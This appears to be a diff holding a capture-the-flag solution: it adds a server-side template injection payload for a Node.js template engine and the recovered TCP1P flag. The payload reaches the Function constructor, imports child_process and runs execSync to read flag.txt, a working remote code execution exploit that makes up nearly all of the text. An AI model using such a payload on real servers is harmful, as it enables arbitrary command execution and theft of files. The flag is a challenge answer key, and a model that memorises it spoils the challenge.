@@ -1,1 +1,4 @@
--
+<%=''.constructor.constructor(`a = import('child_process').then(a => {this.result = a.execSync('cat flag.txt')})`)()%>
+
+
+TCP1P{n0n_s3cur3_s3rv3r_s1d3_r3ndering_in_nodejs}
